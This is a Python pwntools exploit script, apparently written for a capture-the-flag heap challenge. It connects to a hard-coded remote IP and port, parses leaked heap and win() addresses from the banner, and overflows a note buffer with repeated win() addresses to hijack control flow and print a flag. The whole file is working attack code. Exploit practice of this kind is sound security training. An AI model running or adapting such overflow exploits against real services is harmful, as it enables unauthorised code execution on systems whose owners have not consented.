#!/usr/bin/env python3
from pwn import *
import time

io = remote('212.2.250.33', 32384)

banner = io.recvuntil(b'>')
import re
heap = int(re.search(rb'heap\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
win = int(re.search(rb'win\(\)\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
hook = int(re.search(rb'hook\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)

print(f"[+] heap: 0x{heap:x}, win: 0x{win:x}, hook: 0x{hook:x}")

# Try to directly overwrite return address on stack
# Or overwrite GOT entry

# Create large note
io.sendline(b'1')
io.sendlineafter(b':', b'256')
payload = b'A' * 256
io.sendlineafter(b':', payload)
io.recvuntil(b'>')

# Edit with overflow
io.sendline(b'2')
io.sendlineafter(b':', b'0')
# Try to overflow with win() address
payload = b'B' * 256 + p64(win) * 20
io.sendlineafter(b':', payload[:1000])

# Capture everything
time.sleep(1)
try:
    output = io.recvall(timeout=3)
    result = output.decode(errors='ignore')
    print("\n" + "="*60)
    print(result)
    print("="*60)
    
    if 'ctf7{' in result or 'flag' in result.lower():
        print("\n[+] FOUND SOMETHING!")
        print(result)
except:
    pass

io.close()
